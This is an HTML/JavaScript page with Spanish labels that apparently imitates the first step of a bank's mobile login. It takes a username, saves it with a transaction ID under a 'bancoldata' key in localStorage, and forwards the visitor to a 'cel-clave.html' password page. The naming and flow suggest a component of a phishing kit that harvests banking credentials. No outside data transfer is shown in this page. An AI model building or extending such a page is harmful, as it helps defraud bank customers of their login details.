<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <input type="text" placeholder="Usuario" id="userInput">
    
    <div class="button-container">
        <button>Cancelar</button>
        <button id="continueButton" class="disabled">Continuar</button>
    </div>

    <script>
        const userInput = document.getElementById('userInput');
        const continueButton = document.getElementById('continueButton');
        const buttonContainer = document.querySelector('.button-container');

        // Habilitar/Deshabilitar el botón
        userInput.addEventListener('input', () => {
            const userValue = userInput.value.trim();
            if (userValue.length >= 4) {
                continueButton.classList.add('enabled');
                continueButton.classList.remove('disabled');
            } else {
                continueButton.classList.add('disabled');
                continueButton.classList.remove('enabled');
            }
        });

        // Detectar cuando el teclado está visible y mover los botones
        window.addEventListener('resize', () => {
            if (window.innerHeight < 500) {
                buttonContainer.style.top = '77%';
            } else {
                buttonContainer.style.top = '70.4%';
            }
        });

        // Acción al hacer clic en "Continuar"
        continueButton.addEventListener('click', async () => {
            const userValue = userInput.value.trim();
            if (userValue.length >= 4) {
                try {
                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    
                    let bancoldata;
                    try {
                        const storedData = localStorage.getItem('bancoldata');
                        bancoldata = storedData ? JSON.parse(storedData) : {};
                    } catch (e) {
                        console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
                        bancoldata = {};
                    }

                    bancoldata.usuario = userValue;
                    bancoldata.transactionId = transactionId;
                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

                    console.log('Usuario guardado:', userValue, 'Transaction ID:', transactionId);

                    window.location.href = 'cel-clave.html';
                    
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error al procesar la solicitud');
                }
            } else {
                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
            }
        });
    </script>
</body>
</html>
